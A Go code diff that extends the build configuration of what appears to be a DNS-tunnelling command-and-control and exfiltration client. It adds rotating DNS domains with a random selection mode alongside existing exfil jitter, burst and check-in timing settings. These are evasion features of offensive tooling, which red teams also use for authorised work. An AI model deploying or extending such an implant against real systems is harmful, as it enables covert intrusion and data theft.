@@ -10,19 +10,21 @@ import (
 // FullBuildConfig represents the complete nested structure from build_config.json
 type FullBuildConfig struct {
 	Client struct {
-		ServerDomain        string `json:"server_domain"`
-		DNSServer           string `json:"dns_server"`
-		QueryType           string `json:"query_type"`
-		Encoding            string `json:"encoding"`
-		Timeout             int    `json:"timeout"`
-		MaxCommandLength    int    `json:"max_command_length"`
-		RetryAttempts       int    `json:"retry_attempts"`
-		SleepMin            int    `json:"sleep_min"`
-		SleepMax            int    `json:"sleep_max"`
-		ExfilJitterMinMs    int    `json:"exfil_jitter_min_ms"`
-		ExfilJitterMaxMs    int    `json:"exfil_jitter_max_ms"`
-		ExfilChunksPerBurst int    `json:"exfil_chunks_per_burst"`
-		ExfilBurstPauseMs   int    `json:"exfil_burst_pause_ms"`
+		ServerDomain        string   `json:"server_domain"`
+		DNSDomains          []string `json:"dns_domains"`
+		DomainSelectionMode string   `json:"domain_selection_mode"`
+		DNSServer           string   `json:"dns_server"`
+		QueryType           string   `json:"query_type"`
+		Encoding            string   `json:"encoding"`
+		Timeout             int      `json:"timeout"`
+		MaxCommandLength    int      `json:"max_command_length"`
+		RetryAttempts       int      `json:"retry_attempts"`
+		SleepMin            int      `json:"sleep_min"`
+		SleepMax            int      `json:"sleep_max"`
+		ExfilJitterMinMs    int      `json:"exfil_jitter_min_ms"`
+		ExfilJitterMaxMs    int      `json:"exfil_jitter_max_ms"`
+		ExfilChunksPerBurst int      `json:"exfil_chunks_per_burst"`
+		ExfilBurstPauseMs   int      `json:"exfil_burst_pause_ms"`
 	} `json:"client"`
 	Security struct {
 		EncryptionKey string `json:"encryption_key"`
@@ -52,6 +54,8 @@ func main() {
 // embeddedConfig contains the configuration embedded at build time
 var embeddedConfig = Config{
 	ServerDomain:         %q,
+	DNSDomains:          %#v,
+	DomainSelectionMode: %q,
 	DNSServer:            %q,
 	QueryType:            %q,
 	Encoding:             %q,
@@ -73,6 +77,8 @@ func getConfig() Config {
 }
 `,
 		config.Client.ServerDomain,
+		config.Client.DNSDomains,
+		config.Client.DomainSelectionMode,
 		config.Client.DNSServer,
 		config.Client.QueryType,
 		config.Client.Encoding,
@@ -95,7 +101,18 @@ func getConfig() Config {
 	}
 
 	// Show configuration summary with consistent formatting
-	fmt.Printf("  Server Domain:       %s\n", config.Client.ServerDomain)
+	domains := config.Client.DNSDomains
+	if len(domains) == 0 {
+		domains = []string{config.Client.ServerDomain}
+	}
+	fmt.Printf("  DNS Domains:         %v\n", domains)
+	if len(config.Client.DNSDomains) > 1 {
+		mode := config.Client.DomainSelectionMode
+		if mode == "" {
+			mode = "random"
+		}
+		fmt.Printf("  Selection Mode:      %s\n", mode)
+	}
 	fmt.Printf("  Encryption Key:      %s\n", strings.Repeat("*", len(config.Security.EncryptionKey)))
 	fmt.Printf("  Check-in Interval:   %d-%d seconds\n", config.Client.SleepMin, config.Client.SleepMax)
 	fmt.Printf("  Exfil Jitter:        %d-%dms\n", config.Client.ExfilJitterMinMs, config.Client.ExfilJitterMaxMs)
